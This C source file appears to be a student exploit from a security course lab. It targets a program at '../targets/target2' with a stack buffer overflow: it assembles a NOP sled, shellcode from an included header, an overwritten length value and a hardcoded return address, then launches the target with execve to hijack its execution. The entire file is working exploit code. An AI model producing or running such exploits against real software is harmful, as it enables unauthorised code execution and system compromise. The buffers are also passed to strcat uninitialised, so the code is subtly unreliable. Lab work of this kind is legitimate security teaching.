#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];

	// memory address between buff and len
	char buffer[400];
	char *nop = "\x90";
	char *newLen = "\x4c\x01";							 // distance between ret and buff 328+4

	for (int i = 0; i < 213; i++)
		strcat(buffer, nop);
	strcat(buffer, shellcode);
	strcat(buffer, newLen);

	char return_addr[] = "\x80\xfd\x21\x30"; // addr of buff
	char *newI = "\x0c\x01";

	// memory address between i and return address
	char gap[500];
	strcat(gap, newI);
	for (int i = 0; i < 52; i++)  // distance between i and ret
		strcat(gap, nop);
	strcat(gap, return_addr);

	// arguments and envs
	args[0] = TARGET;
	args[1] = buffer;
	args[2] = NULL;

	env[0] = "";
	env[1] = gap;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
